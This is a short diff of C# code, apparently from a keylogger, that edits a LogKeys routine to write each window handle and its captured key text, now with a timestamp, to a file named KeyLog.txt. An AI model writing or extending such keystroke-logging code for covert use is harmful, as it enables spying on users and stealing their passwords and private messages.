@@ -31,8 +31,7 @@ namespace CrcMrc
 
         public void LogKeys()
         {
-            iCount = 0;
-            //String path = @"n:\KeyLog.txt";
+            iCount = 0;            
             String path = @"KeyLog.txt";
             path = Properties.Settings.Default.FileName;
             if (!File.Exists(path))
@@ -64,7 +63,7 @@ namespace CrcMrc
                         text = converter.ConvertToString(i);
                         using (StreamWriter sw = File.AppendText(path))
                         {
-                            sw.WriteLine(hwnd.ToString() + "@" + text);
+                            sw.WriteLine(hwnd.ToString() + "@\t\t" + text + " @\t\t" + DateTime.Now.ToString() );
                             Array.Resize(ref iHwnd, iHwnd.Length + 1);
                             iHwnd.SetValue(hwnd, iHwnd.Length-1);
                         }
